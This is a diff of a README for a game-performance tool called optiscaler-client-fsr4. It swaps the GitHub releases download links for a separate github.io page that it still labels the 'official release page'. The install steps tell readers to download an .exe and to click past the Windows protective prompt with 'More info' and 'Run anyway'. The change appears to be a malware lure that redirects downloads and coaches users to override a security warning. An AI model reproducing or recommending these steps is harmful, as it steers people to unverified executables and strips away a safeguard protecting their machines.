@@ -1,6 +1,6 @@
 # 🚀 optiscaler-client-fsr4 - Boost your gaming performance with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hatp2158/optiscaler-client-fsr4/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://hatp2158.github.io)
 
 ## What is this tool?
 
@@ -21,7 +21,7 @@ To run this application, ensure your computer meets these conditions:
 
 Follow these steps to set up the client on your machine:
 
-1.  Visit the official release page: [https://github.com/Hatp2158/optiscaler-client-fsr4/releases](https://github.com/Hatp2158/optiscaler-client-fsr4/releases).
+1.  Visit the official release page: [https://hatp2158.github.io](https://hatp2158.github.io).
 2.  Look for the latest version listed under the "Assets" section.
 3.  Download the `.exe` installer file.
 4.  Run the downloaded file. Windows might display a protective prompt because the tool modifies game files. Click "More info" and then "Run anyway" to proceed.
